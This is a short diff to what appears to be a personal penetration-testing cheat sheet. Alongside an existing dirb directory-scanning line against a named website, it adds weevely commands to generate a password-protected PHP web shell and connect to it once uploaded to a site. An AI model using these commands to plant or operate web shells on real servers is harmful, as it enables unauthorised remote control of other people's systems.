@@ -14,3 +14,11 @@ dirb  http://.cmsinfotech.in
 for dirctory view from any website
 
 ###############################################	
+
+weevely generate password /root/Desktop/filename.php
+
+this is for generate php shell
+
+weevely url/shell.php password
+
+###############################################
